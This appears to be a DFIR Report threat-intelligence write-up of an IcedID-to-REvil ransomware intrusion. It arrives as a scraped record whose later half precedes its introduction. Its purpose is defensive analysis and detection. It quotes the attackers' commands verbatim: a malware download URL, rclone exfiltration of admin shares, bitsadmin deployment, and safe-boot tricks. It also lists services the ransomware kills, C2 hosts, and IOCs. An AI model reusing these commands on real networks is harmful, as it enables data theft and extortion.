Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Print Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Infra,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Security Administrator,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Security Reader,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Compliance Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Discovery Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Hygiene Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Delegated Setup,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Records Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Help Desk,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=UM Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Public Folder Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=View-Only Organization Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=DnsUpdateProxy,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Recipient Management,OU=Microsoft Exchange Security Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Protected Users,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Cloneable Domain Controllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Enterprise Key Admins,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Key Admins,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Domain Guests,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Read-only Domain Controllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Domain Computers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Domain Users,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Domain Controllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted. Once on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity. AdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name. cmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv Lateral Movement For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike. Cobalt Strike Beacon executables were transferred using SMB and executed via a remote service. On other systems, PowerShell was used with the same remote service execution. To facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment. Collection The Rclone utility was used to collect information from file shares and to exfiltrate the data. svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName Command and Control IcedID : cikawemoret34.space 206.189.10.247:80 nomovee.website 161.35.109.168:443 JA3: a0e9f5d64349fb13191bc781f81f42e1 JA3s: ec74a5c51106f0419184d0dd08fb05bc Certificate :[ e0:fc:e5:eb:fd:e7:da:0b:93:ac:dc:df:0d:e8:56:cc:7b:f2:58:43 ] Not Before: 2021/03/11 02:06:51 Not After: 2022/03/11 02:06:51 Issuer Org: Internet Widgits Pty Ltd Subject Common: localhost Subject Org: Internet Widgits Pty Ltd Public Algorithm: rsaEncryption Cobalt Strike: 45.86.163.78:443 cloudmetric.online JA3:a0e9f5d64349fb13191bc781f81f42e1 JA3s: ae4edc6faf64d08308082ad26be60767 Certificate: [ b9:2c:48:71:1a:ba:eb:99:15:c4:0b:b0:31:ce:14:8e:a9:30:ac:d3 ] Not Before: 2021/02/27 06:45:42 Not After: 2021/05/28 07:45:42 Issuer Org: Let's Encrypt Subject Common: cloudmetric.online [ cloudmetric.online ] Public Algorithm: rsaEncryption Cobalt Config: { \"x64\": { \"config\": { \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\", \"Beacon Type\": \"0 (HTTP)\", \"Method 2\": \"POST\", \"Polling\": 48963, \"Jitter\": 24, \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\", \"Method 1\": \"GET\", \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\", \"Port\": 80 }, \"sha256\": \"8d44894c09a2e30b40927f8951e01708d0a600813387c3c0872bcd6cb10a3e8c\", \"sha1\": \"deab6be62e9c9793f9874bbdec9ff0a3acb82ad8\", \"md5\": \"28ceee1f8f529a80bd0ff5e52240e404\", \"time\": 1615840900656.6 }, \"x86\": { \"config\": { \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\", \"Beacon Type\": \"0 (HTTP)\", \"Method 2\": \"POST\", \"Polling\": 48963, \"Jitter\": 24, \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\", \"Method 1\": \"GET\", \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\", \"Port\": 80 }, \"sha256\": \"11af3609884ad674a1c86f42ec27719094e935d357d73e574b75c787a0e8c0f1\", \"sha1\": \"a30de5ca8a107fd69c8885a975224ea8ff261002\", \"md5\": \"bbc6592c67d233640a9ca0d0d915003c\", \"time\": 1615840895189 } } 195.189.99.74 smalleststores.com JA3: 72a589da586844d7f0818ce684948eea JA3s: ae4edc6faf64d08308082ad26be60767 Certificate: [ 14:f4:79:e3:fd:98:21:60:68:fd:1c:0a:e6:c6:f9:71:f4:ac:f9:df ] Not Before: 2021/03/11 11:02:43 Not After: 2021/06/09 12:02:43 Issuer Org: Let's Encrypt Subject Common: smalleststores.com [ smalleststores.com ] Public Algorithm: rsaEncryption Cobalt Config: { \"x86\": { \"config\": { \"Method 1\": \"GET\", \"Method 2\": \"GET\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\", \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\", \"Beacon Type\": \"8 (HTTPS)\", \"Polling\": 59713, \"Jitter\": 41, \"Port\": 443, \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\", \"HTTP Method Path 2\": \"/OWA/\" }, \"md5\": \"88365eb3d504f570f22d76f777ab2caf\", \"sha256\": \"4b25f708c506e0cc747344ee79ecda48d51f6c25c9cb45ceb420575458f56720\", \"sha1\": \"f42f2eea6cf88d30cfd6207182528be6ae2e504f\", \"time\": 1615846680369.8 }, \"x64\": { \"config\": { \"Method 1\": \"GET\", \"Method 2\": \"GET\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\", \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\", \"Beacon Type\": \"8 (HTTPS)\", \"Polling\": 59713, \"Jitter\": 41, \"Port\": 443, \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\", \"HTTP Method Path 2\": \"/OWA/\" }, \"md5\": \"27ca24a7f6d02539235d46e689e6e4ac\", \"sha256\": \"e35c31ba3e10f59ae7ea9154e2c0f6f832fcff22b959f65b607d6ba0879ab641\", \"sha1\": \"6885d84c1843c41ff8197d7ab0c8e42e20a7ecaa\", \"time\": 1615846684589 } } Exfiltration Data that was collected from the domain was exfiltrated to a remote server at: 45.147.160.5:443 Impact For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems. C:\\Windows\\system32\\bitsadmin.exe /transfer debjob /download /priority normal \\\\DOMIANCONTROLLER\\c$\\windows\\DOMAINNAME.exe C:\\Windows\\DOMAINNAME.exe The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam . Not remember seeing these before in REvil ransomware samples. \ud83e\udd14 So basically the actors using REvil now can use it to reboot target machines into safe mode with networking\u2026 @demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO \u2014 MalwareHunterTeam (@malwrhunterteam) March 18, 2021 See below for -smode execution: The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine. The systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen. About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop. Services were not able to be started, which led to collection issues, as normal agents did not start. This also included the startup of EDR and management agents. We\u2019ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation. \ud83c\udd95 #REvil v2.05 -smode switch configures OS to boot into safe mode w/ networking via: (pre-Vista) bootcfg /raw /a /safeboot:network /id 1 or (Vista+) bcdedit /set {current} safeboot network configures auto-lognn via WinLogon \ud83d\udd11 w/ 'DTrump4ever' password \u2014 R3MRUM (@R3MRUM) March 26, 2021 After rebooting out of Safe Mode, you are left with the following desktop: On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files. C:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\DomainName.dll,DllRegisterServer The threat actors asked for 200k in Monero. They were talked down 20-30% and could have been talked down more. Here\u2019s a few screenshots from the website. With the help of @hatching_io ( https://tria.ge/) we were able to parse the config from the ransomware sample. Campaign ID (sub): 7114 net: false List of processes to kill (prc) oracle klnagent mydesktopqos infopath BackupExtender powerpnt outlook BackupAgent Smc sql ccSvcHst BackupUpdater Rtvscan winword kavfsscs ocssd isqlplussvc visio ShadowProtectSvc tbirdconfig TSSchBkpService dbeng50 ccSetMgr agntsvc Sage.NA.AT_AU.SysTray dbsnmp thebat onenote AmitiAvSrv wordpad msaccess avgadmsv thunderbird BackupMaint Microsoft.exchange.store.worker.exe CarboniteUI excel SPBBCSvc LogmeInBackupService encsvc ocomm sqbcoreservice NSCTOP mydesktopservice kavfs kavfswp ocautoupds mspub xfssvccon DLOAdminSvcu synctime lmibackupvssservice firefox steam dlomaintsvcu List of services to kill Telemetryserver \"Sophos AutoUpdate Service\" sophos Altaro.Agent.exe mysqld MSSQL$MSGPMR \"SophosFIM\" \"Sophos Web Control Service\" SQLWriter svcGenericHost AltiBack \"SQLServer Analysis Services (MSSQLSERVER)\" BackupExecAgentAccelerator \"StorageCraft ImageReady\" SQLTELEMETRY AzureADConnectAuthenticationAgent ntrtscan ds_notifier TeamViewer \"StorageCraft Raw Agent\" \"StorageCraft Shadow Copy Provider\" SQLTELEMETRY$SQLEXPRESS VeeamHvIntegrationSvc AltiCTProxy MsDtsServer130 ViprePPLSvc McAfeeFramework MSSQL$QM \"swi_service\" \"ThreadLocker\" ofcservice AUService sophossps AzureADConnectHealthSyncMonitor Altaro.OffsiteServer.UI.Service.exe \"SAVAdminService\" ds_monitor ALTIVRM SSASTELEMETRY TmCCSF MsDtsServer110 \"Sophos MCS Client\" TMBMServer SBAMSvc mfewc \"Sophos System Protection Service\" MSSQLFDLauncher$TESTBACKUP02DEV VeeamDeploymentService masvc backup MSSQL$SQLEXPRESS AltiPhoneServ MSSQLServerOLAPService SSISTELEMETRY130 VeeamEndpointBackupSvc mepocs Altaro.UI.Service.exe \"ds_agent\" HuntressUpdater MSSQLFDLauncher \"Sophos File Scanner Service\" SQLAgent$MSGPMR ADSync KaseyaAgent ReportServer MSSQLFDLauncher$SQLEXPRESS MSSQL$HPWJA KaseyaAgentEndpoint VeeamTransportSvc \"ds_monitor\" mfevtp MSSQLTESTBACKUP02DEV SQLTELEMETRY$MSGPMR ThreadLocker MSSQLServerADHelper100 veeam tmlisten AzureADConnectHealthSyncInsights \"swi_filter\" MsDtsServer120 ProtectedStorage VeeamDeploySvc memtas ds_agent VeeamMountSvc HuntressAgent SQLAgent$SQLEXPRESS bedbg MSSQLSERVER \"ofcservice\" VipreAAPSvc \"Sophos Endpoint Defense Service\" KACHIPS906995744173948 DsSvc MSSQLLaunchpad$SQLEXPRESS msseces macmnsvc LTService Code42Service Altaro.HyperV.WAN.RemoteService.exe LTSvcMon MSSQL$SQLEXPRESSADV \"SAVService\" Altaro.OffsiteServer.Service.exe \"Sage 100cloud Advanced 2020 (9920)\" Altaro.SubAgent.exe mfemms \"TeamViewer\" \"SQLServer Reporting Services (MSSQLSERVER)\" VSS sql Altaro.SubAgent.N2.exe \"SQLServer Integration Services 12.0\" SQLSERVERAGENT vss \"Sophos Safestore Service\" klnagent \"Sage.NA.AT_AU.Service\" MBAMService \"Sophos Health Service\" SQLBrowser MySQL \"ProtectedStorage\" \"Sophos Clean Service\" \"Sage 100c Advanced 2017 (9917)\" \"SntpService\" VeeamNFSSvc KAVFS SQLEXPRESSADV KAENDCHIPS906995744173948 sppsvc Amsp psqlWGE Microsoft.exchange.store.worker.exe kavfsscs \"Amsp\" sqlservr Altaro.DedupService.exe svc$ \"ds_notifier\" \"Sophos Device Control Service\" AzureADConnectAgentUpdater AltiFTPUploader \"Sophos MCS Agent\" Triage sandbox run of the executable without smode: IOCs Network 45.86.163.78|80 45.86.163.78|443 45.86.163.78|8080 195.189.99.74|80 195.189.99.74|443 195.189.99.74|8080 206.189.10.247|80 161.35.109.168|443 smalleststores.com cloudmetric.online cikawemoret34.space nomovee.website File skull-x64.dat 5c3a6978bb960d8fbccd117ddcc3ca10 17424cfeb756e231bea6d1363151a83af142ba6f 59a2a5fae1c51afbbf1b8c6eb0a65cb2b8575794e3890f499f8935035e633fc Ciocca.dll 296f1098a3a8cfb7e07808ee08361495 7d903f87fd305f1c93ec420848fd6e5aeb018d59 b1b00f7b065e8c013e0c23c0f34707819e0d537dbe2e83d0d023a11a0ca6b388 license.dat 6f208841cfd819c29a7cbc0a202bd7a3 0febc376cc066bb668f1a80b969ed112da8e871c 45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865 DomainName.dll c8fab46c4fd61c5f138fb151638c35e1 c4830cbf3a3044f6e50cd60127ff5681f8ee4bbf 64076294e761cee0ce7d7cd28dae05f483a711eafe47f94fe881ac3980abfd8f DomainName.exe af94ccb62f97700115a219c4b7626d22 bb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7 2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c svchost.exe (rclone) fcfcf1e45e8d5cdca0450b8dc90754b68e8e4673 538078ab6d80d7cf889af3e08f62c4e83358596f31ac8ae8fbc6326839a6bfe5 AdFind.exe cb198869ca3c96af536869e71c54dd9d83afbee6 56de41fa0a94fa7fff68f02712a698ba2f0a71afcecb217f6519bd5751baf3ed Detections Network ETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2 ET DNS Query to a *.top domain ET POLICY OpenSSL Demo CA - Internet Widgits Pty Sigma https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_enc_cmd.yml https://github.com/Neo23x0/sigma/blob/084cd39505861188d9d8f2d5c0f2835e4f750a3f/rules/windows/process_creation/win_malware_trickbot_recon_activity.yml https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/sysmon_rundll32_net_connections.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_process_creation_bitsadmin_download.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_adfind.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_wmi_execution.yml https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_office_shell.yml Custom rule thanks to @0xThiebaut title: Sodinokibi Ransomware Registry Key id: 9fecd354-77f0-498e-a611-c963970e7bca description: Detects the creation of Sodinokibi (aka REvil) registry keys status: experimental references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ - https://twitter.com/malwrhunterteam/status/1372648463553462279 tags: - attack.persistence - attack.t1547.001 date: 2021/03/29 author: Maxime THIEBAUT (@0xThiebaut) logsource: category: registry_event product: windows detection: selection: TargetObject|contains: - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca' - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit' condition: selection level: high Custom rule thanks to @lindodapoet_ title: Svchost data exfiltration id: dc4249c9-d96f-401b-a92b-caa6208c097d status: experimental description: Detects possible data exfiltration via svchost references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ author: Nclose date: 2021/03/29 tags: - attack.exfiltration - attack.t1048 logsource: product: windows service: process_creation detection: selection: CommandLine|contains: 'copy' Image|endswith: '\\svchost.exe' condition: selection falsepositives: - Unknown level: high Custom rules and rule ideas written by @BlackMatter23 It was the most time consuming #ThreatIntel report in my career\ud83d\ude24 #REvil TTPs hunting campaign is finished: \u2013 37 detection ideas \u2013 81 detection rules (Windows/Sysmon/EDR) plus BloodHound & BITS jobs: https://t.co/GoDYfvaFJF Excellent work @TheDFIRReport team! #threathunting pic.twitter.com/Tw1OyIMCki \u2014 Vadim Khrykov (@BlackMatter23) August 19, 2021 Yara /* YARA Rule Set Author: The DFIR Report Date: 2021-03-29 Identifier: files Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule Sodinokibi_032021 { meta: description = \"files - file DomainName.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-03-21\" hash1 = \"2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\" strings: $s1 = \"vmcompute.exe\" fullword wide $s2 = \"vmwp.exe\" fullword wide $s3 = \"bootcfg /raw /a /safeboot:network /id 1\" fullword ascii $s4 = \"bcdedit /set {current} safeboot network\" fullword ascii $s5 = \"7+a@P>:N:0!F$%I-6MBEFb M\" fullword ascii $s6 = \"jg:\\\"\\\\0=Z\" fullword ascii $s7 = \"ERR0R D0UBLE RUN!\" fullword wide $s8 = \"VVVVVPQ\" fullword ascii $s9 = \"VVVVVWQ\" fullword ascii $s10 = \"Running\" fullword wide /* Goodware String - occured 159 times */ $s11 = \"expand 32-byte kexpand 16-byte k\" fullword ascii $s12 = \"9RFIT\\\"&\" fullword ascii $s13 = \"jZXVf9F\" fullword ascii $s14 = \"tCWWWhS=@\" fullword ascii $s15 = \"vmms.exe\" fullword wide /* Goodware String - occured 1 times */ $s16 = \"JJwK9Zl\" fullword ascii $s17 = \"KkT37uf4nNh2PqUDwZqxcHUMVV3yBwSHO#K\" fullword ascii $s18 = \"0*090}0\" fullword ascii /* Goodware String - occured 1 times */ $s19 = \"5)5I5a5\" fullword ascii /* Goodware String - occured 1 times */ $s20 = \"7-7H7c7\" fullword ascii /* Goodware String - occured 1 times */ condition: uint16(0) == 0x5a4d and filesize < 400KB and ( pe.imphash() == \"031931d2f2d921a9d906454d42f21be0\" or 8 of them ) } rule icedid_032021_1 { meta: description = \"files - file skull-x64.dat\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-03-21\" hash1 = \"59a2a5fae1c51afbbf1bf8c6eb0a65cb2b8575794e3890f499f8935035e633fc\" strings: $s1 = \"update\" fullword ascii /* Goodware String - occured 207 times */ $s2 = \"PstmStr\" fullword ascii $s3 = \"mRsx0k/\" fullword wide $s4 = \"D$0lzK\" fullword ascii $s5 = \"A;Zts}H\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 100KB and ( pe.imphash() == \"67a065c05a359d287f1fed9e91f823d5\" and ( pe.exports(\"PstmStr\") and pe.exports(\"update\") ) or all of them ) } rule icedid_032021_2 { meta: description = \"1 - file license.dat\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-03-21\" hash1 = \"45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\" strings: $s1 = \"+ M:{`n-\" fullword ascii $s2 = \"kwzzdd\" fullword ascii $s3 = \"w5O- >z\" fullword ascii $s4 = \"RRlK8n@~\" fullword ascii $s5 = \"aQXDUkBC\" fullword ascii $s6 = \"}i.ZSj*\" fullword ascii $s7 = \"kLeSM?\" fullword ascii $s8 = \"qmnIqD\\\")P\" fullword ascii $s9 = \"aFAeU!,\" fullword ascii $s10 = \"Qjrf\\\"Q\" fullword ascii $s11 = \"PTpc,!P#\" fullword ascii $s12 = \"r@|JZOkfmT2\" fullword ascii $s13 = \"aPvBO,4\" fullword ascii $s14 = \">fdFhl^S8Z\" fullword ascii $s15 = \"[syBE0\\\\\" fullword ascii $s16 = \"`YFOr.JH\" fullword ascii $s17 = \"C6ZVVF j7}\" fullword ascii $s18 = \"LPlagce\" fullword ascii $s19 = \"NLeF_-e`\" fullword ascii $s20 = \"HRRF|}O\" fullword ascii condition: uint16(0) == 0x43da and filesize < 1000KB and 8 of them } MITRE Spearphishing Attachment - T1566.001 User Execution - T1204 Windows Management Instrumentation - T1047 Process Injection - T1055 Domain Trust Discovery - T1482 Domain Account - T1087.002 System Information Discovery - T1082 System Network Configuration Discovery - T1016 Security Software Discovery - T1518.001 SMB/Windows Admin Shares - T1021.002 Remote Desktop Protocol - T1021.001 Commonly Used Port - T1043 Application Layer Protocol - T1071 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002 Data Encrypted for Impact - T1486 Malicious File - T1204.002 Command and Scripting Interpreter - T1059 PowerShell - T1059.001 Scheduled Task - T1053.005 Remote System Discovery - T1018 Rundll32 - T1218.011 Internal case # 1051 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Bazar Drops the Anchor Trickbot Brief: Creds and Beacons Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "Sodinokibi (aka REvil) Ransomware \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind cobaltstrike icedid ransomware revil Sodinokibi Sodinokibi (aka REvil) Ransomware March 29, 2021 Intro Sodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand. In March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat actors escalated privileges to Domain Administrator, exfiltrated data, and used Sodinokibi to ransom all domain joined systems. Case Summary The IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families . In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image. Persistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution. About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion. Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers. We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID. #ArtifactsMatter. It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike. After compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service. The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique. Additional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems. After discovery was completed, credentials were dumped from lsass. After completing these tasks the threat actors began to establish RDP connections between various systems in the domain. Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand. At the four hour mark, the threat actors began to move on to final objectives. They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain. After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking. Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot. Booting into Safe Mode with Networking blocked the startup of security tools and other management agents. Networking worked, but because services couldn\u2019t start, we were unable to remotely manage the systems using our normal tools. We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution. On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed. About 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems. The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days. If we didn\u2019t pay within 7 days the price goes up to around $400k. The ransom is required to be paid in Monero instead of the usual Bitcoin. This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis . The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful. Services Our Threat Feed service picked up one of the two Cobalt Strike servers one day before this intrusion occurred and the other IP was added to the feed as soon as we recognized it. We also have artifacts available from this case such as ransomware samples (dll and exe), pcaps, memory captures, files, Kape packages and more, under our Security Researcher and Organization services. Timeline MITRE ATT&CK Initial Access Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn . The delivery format was an xlsm file : Initial execution of the document writes a file to: C:\\Users\\Public\\microsoft.security The Excel file called wmic to execute the file with regsrv32 wmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security' This then made a network request to download a file from this URL http://vpu03jivmm03qncgx.com/index.gif The GIF however was the IcedID malware. Execution Once IcedID was downloaded to the host, the malware was executed using rundll32.exe rundll32.exe \"C:\\Users\\USERNAME\\AppData\\Local\\Temp\\skull-x64.dat\",update /i:\"DwarfWing\\license.dat\" After execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion. Persistence IcedID setup persistence on the beach head host using a scheduled task. wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D} HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D} The execution of the ransomware executable created a RunOnce key for persistence. 